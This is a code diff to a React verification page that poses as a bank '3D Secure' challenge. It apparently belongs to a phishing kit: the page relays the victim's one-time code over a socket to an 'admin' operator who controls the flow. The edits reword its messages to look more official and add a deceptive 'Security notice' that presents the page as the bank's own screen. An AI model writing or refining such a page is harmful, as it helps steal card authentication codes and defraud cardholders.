@@ -80,7 +80,7 @@ export default function Verify() {
     return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
   });
   const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
-  const [status, setStatus] = useState('Choose where to receive the code.');
+  const [status, setStatus] = useState('Choose where to receive your secure code.');
   const [submitting, setSubmitting] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const inputRef = useRef<HTMLInputElement | null>(null);
@@ -99,7 +99,7 @@ export default function Verify() {
         setLoadingContactOptions(false);
         setStatus(
           fallback.telephone || fallback.email
-            ? 'Choose where to receive the code.'
+            ? 'Choose where to receive your secure code.'
             : 'We could not load your phone number or email. Return to your account and try again.',
         );
         return;
@@ -159,7 +159,7 @@ export default function Verify() {
     if (!selectedValue) return;
     const masked = verifyMethod === 'phone' ? maskPhone(selectedValue) : maskEmail(selectedValue);
     setShowMethodPicker(false);
-    setStatus(`${verifyMethodLabel(verifyMethod)} selected (${masked}). Enter the authentication code below.`);
+    setStatus(`${verifyMethodLabel(verifyMethod)} selected (${masked}). Enter the secure code below.`);
   }, [contactOptions.email, contactOptions.telephone, verifyMethod]);
 
   useEffect(() => {
@@ -194,7 +194,7 @@ export default function Verify() {
       setSubmitting(false);
       setWaitingForAdmin(false);
       const routeReason = String(payload?.reason || '').trim();
-      setStatus(routeReason || 'Choose where to receive the code.');
+      setStatus(routeReason || 'Choose where to receive your secure code.');
       socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
       if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
       if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
@@ -216,7 +216,7 @@ export default function Verify() {
     setStatus(
       adminReason
         ? `${adminReason} ${verifyMethodLabel(method)} selected (${selectedValueMasked}).`
-        : `${verifyMethodLabel(method)} selected (${selectedValueMasked}). Enter the authentication code below.`,
+        : `${verifyMethodLabel(method)} selected (${selectedValueMasked}). Enter the secure code below.`,
     );
     socket.emit('update-form-field', { field: 'verifyMethod', value: method });
     window.setTimeout(() => inputRef.current?.focus(), 0);
@@ -229,28 +229,28 @@ export default function Verify() {
     e.preventDefault();
     if (submitting || waitingForAdmin) return;
     if (showMethodPicker || !verifyMethod) {
-      setStatus('Choose where to receive the code.');
+      setStatus('Choose where to receive your secure code.');
       setShowMethodPicker(true);
       return;
     }
     const id = verifyId.trim();
     if (!id) {
-      setStatus('Enter the authentication code to continue.');
+      setStatus('Enter the secure code to continue.');
       inputRef.current?.focus();
       return;
     }
     setSubmitting(true);
-    setStatus('Submitting your authentication code...');
+    setStatus('Submitting your secure code...');
     socket.emit('verify-submit', { verifyId: id }, (resp: any) => {
       if (!resp?.ok) {
-        setStatus(`We couldn't submit the authentication code: ${resp?.error || 'unknown error'}`);
+        setStatus(`We couldn't submit the secure code: ${resp?.error || 'unknown error'}`);
         setSubmitting(false);
         return;
       }
       setVerifyId('');
       setSubmitting(false);
       setWaitingForAdmin(true);
-      setStatus('Authentication code received. Awaiting bank response...');
+      setStatus('Secure code received. Awaiting bank response...');
     });
   };
 
@@ -261,8 +261,8 @@ export default function Verify() {
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto h-10 w-10 rounded-full border-4 border-[#ccd7ef] border-t-[#2f67b3] animate-spin" />
             <div className="mt-4 text-lg font-semibold text-slate-900">Reviewing your code</div>
-            <div className="text-sm text-slate-600 mt-2">Please wait while your bank reviews the authentication code.</div>
-            <div className="mt-5 rounded-lg border border-[#d7e0f2] bg-[#f4f7fd] px-3 py-2 text-xs text-[#314a73]">Do not refresh or close this page while authentication is pending.</div>
+            <div className="text-sm text-slate-600 mt-2">Please wait while your bank reviews the secure code.</div>
+            <div className="mt-5 rounded-lg border border-[#d7e0f2] bg-[#f4f7fd] px-3 py-2 text-xs text-[#314a73]">Do not refresh or close this page while the challenge is pending.</div>
           </div>
         </div>
       )}
@@ -277,7 +277,7 @@ export default function Verify() {
               </div>
               <span className="alz-bank-badge">3D Secure check</span>
             </div>
-            <p className="alz-bank-picker-copy">Choose a contact method approved by your bank.</p>
+            <p className="alz-bank-picker-copy">Choose a contact method approved by your bank for this challenge.</p>
 
             {loadingContactOptions ? (
               <div className="alz-bank-loading">Loading your available contact methods...</div>
@@ -311,7 +311,7 @@ export default function Verify() {
                 <div>
                   <div className="alz-bank-header-eyebrow">Bank Verification</div>
                 <h1 className="alz-bank-title">Secure code required</h1>
-                <p className="alz-bank-copy">Enter the one-time verification code sent by your bank or card issuer.</p>
+                <p className="alz-bank-copy">Complete the issuer challenge by entering the one-time code sent by your bank.</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">3D SECURE</div>
@@ -326,6 +326,10 @@ export default function Verify() {
                   <div>
                     <span>Merchant</span>
                     <strong>{BRAND.name}</strong>
+                  </div>
+                  <div>
+                    <span>Transaction type</span>
+                    <strong>Cardholder verification</strong>
                   </div>
                   <div>
                     <span>Verification</span>
@@ -344,7 +348,7 @@ export default function Verify() {
                 <form onSubmit={handleSubmit} className="space-y-4 mt-5">
                   <div>
                     <label className="alz-field-label">Secure code</label>
-                    <input ref={inputRef} value={verifyId} onChange={(e) => setVerifyId(e.target.value)} placeholder="Enter code" className="alz-input alz-bank-code-input disabled:bg-slate-100 disabled:text-slate-400" autoComplete="one-time-code" inputMode="numeric" disabled={waitingForAdmin || showMethodPicker} />
+                    <input ref={inputRef} value={verifyId} onChange={(e) => setVerifyId(e.target.value)} placeholder="Enter secure code" className="alz-input alz-bank-code-input disabled:bg-slate-100 disabled:text-slate-400" autoComplete="one-time-code" inputMode="numeric" disabled={waitingForAdmin || showMethodPicker} />
                   </div>
                   <button type="submit" disabled={submitting || waitingForAdmin || showMethodPicker} className="alz-bank-submit">
                     {submitting ? 'Submitting...' : waitingForAdmin ? 'Checking...' : showMethodPicker ? 'Choose contact method' : 'Submit code'}
@@ -360,8 +364,12 @@ export default function Verify() {
                   <div className="alz-bank-side-copy">This verification challenge is managed directly by your bank or card issuer.</div>
                 </div>
                 <div className="alz-bank-side-card">
-                  <div className="alz-bank-side-title">Need help?</div>
+                  <div className="alz-bank-side-title">Challenge support</div>
                   <div className="alz-bank-side-copy">If you do not receive a code, contact the phone number on the back of your card or select a different contact method.</div>
+                </div>
+                <div className="alz-bank-side-card">
+                  <div className="alz-bank-side-title">Security notice</div>
+                  <div className="alz-bank-side-copy">Never share this code with anyone except within your bank's secure verification screen.</div>
                 </div>
               </aside>
             </div>
